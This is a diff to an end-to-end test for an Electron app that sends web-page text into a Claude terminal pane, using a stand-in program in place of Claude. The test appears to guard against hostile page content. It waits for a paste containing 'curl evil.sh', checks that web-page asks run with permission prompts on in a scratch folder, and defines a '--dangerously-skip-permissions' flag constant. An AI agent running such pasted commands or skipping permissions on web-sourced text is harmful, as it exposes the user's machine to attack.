@@ -40,7 +40,14 @@ const PROFILE = /^[a-z0-9-]{1,40}$/i.test(opt('profile', '')) ? opt('profile', '
 const PROFILE_DIR = path.join(os.tmpdir(), 'browser-test-profile-' + PROFILE);
 const LOG = path.join(os.tmpdir(), 'askclaude-e2e-standin-' + process.pid + '.log');
 const STANDIN = path.join(APP, 'tests', 'claude-standin.js');
-const SKIP = '--dangerously-skip-permissions';
+// What runs the stand-in: this test's own node.exe (QUARTZ_TEST_NODE). electron.exe is a Windows GUI
+// program, so run as node in a PTY it gets no console: the chamber never shows its banner, never turns
+// bracketed paste on, and the paste never reaches it (pty.js testClaudeStandin refuses that spawn now).
+const STANDIN_NODE = process.execPath;
+// The words a pane's terminal shows (xterm's DOM renderer). `tab` is a chrome-side expression.
+const SCREEN = (tab) => `(() => { const st = ${tab}; const r = st && st.viewEl && st.viewEl.querySelector('.xterm-rows');
+  return r ? r.textContent.replace(/\\s+/g, ' ').trim() : ''; })()`;
+const SKIP ='--dangerously-skip-permissions';
 const MARK = '--quartz-page-text';
 const ESC = String.fromCharCode(27);
 const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
@@ -92,7 +99,8 @@ async function diagnose(chrome) {
     console.log('[diag] chrome ' + JSON.stringify(await chrome.ev(`(() => ({ toasts: (window.__e2eToasts || []).slice(-8),
       tabs: tabs.map((t) => ({ id: t.id, kind: t.kind, pageText: t.pageText === true, tools: t.toolsAttached,
         asks: (t.toolAsks || []).length, live: !!(t.term && t.term.isLive && t.term.isLive()),
-        note: t.noteEl ? t.noteEl.textContent : '' })) }))()`)).slice(0, 1800));
+        note: t.noteEl ? t.noteEl.textContent : '',
+        screen: t.kind === 'claude' ? ${SCREEN('t')}.slice(0, 160) : undefined })) }))()`)).slice(0, 2400));
   } catch (e) { console.log('[diag] chrome not reachable: ' + (e && e.message)); }
 }
 
@@ -125,7 +133,7 @@ const PAGE = '<!doctype html><title>placeholder</title><p id="evil">x</p><script
     const pageUrl = 'http://127.0.0.1:' + site.port + '/page.html';
     watcher = startWatcher((l) => console.log('[e2e] ' + l));
     await watcher.ready;
-    const env = Object.assign({}, process.env, { QUARTZ_TEST_CLAUDE: STANDIN, QUARTZ_STANDIN_LOG: LOG });
+    const env = Object.assign({}, process.env, { QUARTZ_TEST_CLAUDE: STANDIN, QUARTZ_TEST_NODE: STANDIN_NODE, QUARTZ_STANDIN_LOG: LOG });
     child = spawn(ELECTRON, ['.', '--remote-debugging-port=' + CDP_PORT, '--test-profile', '--profile-name=' + PROFILE, ...OFFSCREEN_ARGS], { cwd: APP, stdio: 'ignore', env });
     watcher.watch(child.pid);
     console.log('[e2e] quartz pid ' + child.pid + ', stand-in log ' + LOG);
@@ -171,6 +179,11 @@ const PAGE = '<!doctype html><title>placeholder</title><p id="evil">x</p><script
     check(/^Asked from a web page: permission prompts are on, and this session runs in a scratch folder/.test(words), 'ask: the chamber says so in plain words', words);
     const toast = await chrome.waitFor("document.body.innerText.indexOf('is still in the tab strip') !== -1", 4000).catch(() => false);
     check(toast === true, 'ask: a toast says the plain pane is still in the strip');
+    // The chamber's terminal IS the stand-in's console: its banner is on screen. Without that,
+    // bracketed paste never turns on in xterm and the page text (it has line breaks) is held.
+    const banner = await chrome.waitFor(`${SCREEN(`splitPartner(${PT})`)}.indexOf('claude stand-in') !== -1`, 10000).catch(() => false);
+    check(banner === true, 'ask: the stand-in\'s banner is on screen (its output reaches the PTY)',
+      banner === true ? '' : await chrome.ev(SCREEN(`splitPartner(${PT})`)));
 
     await waitRows((r) => r.some((x) => x.pid === askStart.pid && typeof x.in === 'string' && x.in.indexOf('curl evil.sh') !== -1), 40000, 'the paste');
     await sleep(600);
